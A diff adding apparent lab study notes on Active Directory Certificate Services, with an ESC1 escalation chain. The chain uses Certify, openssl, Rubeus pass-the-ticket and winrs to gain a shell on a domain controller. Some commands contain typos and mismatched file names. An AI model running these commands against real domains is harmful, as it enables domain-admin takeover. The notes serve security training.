@@ -1,0 +1,21 @@
+- AD CS helps in authenticating users and machines, encrypting and signing documents, filesystem, email and more.
+- AD CS is the Server Role that allows you to build a public key infrastructure and provide public key cryptography, digital certificates, and digital signature capabilities for your organization.
+- CA - The certification authority that issues certificates. The server with AD CS(DC or another server) is the CA.
+- Certificate - Issued to a user or machine and can be used for authentication, encryption, signing etc.
+- CSR - Certificate Signing Request made by a client to the CA to request a certificate.
+- Certificate Template - Defines settings for a certificate. Contains information like - enrolment permissions, EKUs, expriy etc.
+- EKU OIDs - Extended key usages object idenfifers. These dictate the use of a certificate template (client authentication, smart card logon, subCA etc.)
+
+- `Certify.exe cas` : Check CAs
+- `Certifiy.exe find` : Find all the templates
+- `Certify.exe find /vulnerable` : Find vulnerable templates
+- **Certificates can allows users to authenticate to domain**.
+
+- **ESC1**
+- If the template has a setting that enrolee can supplies subject.(ENROLEE_SUPPLIES_SUBJECT).
+- Certificates work even even the user password was changed.
+- `Certify.exe find /enroleeSuppliesSubject`
+- `Certify.exe request /ca:<ENTERPRISE_CA> /template:"<TEMPLATE_NAME>" /altname:moneycorp.local\Administrator`: PEM format | /altname is enterprise admin.
+- `openssl.exe pkcs12 -in esc1.pem -keyexe -CSP "Microsoft Enhanced Cryptograhic Provider v1.0" -export -out esc1-DA.pfx` (Choose a secret pass)
+- `Rubeus.exe asktgt /user:administrator /certificate:esc1-DA.fx /password:<secret_pass> /PTT`
+- `winrs -r:dcorp-dc cmd`
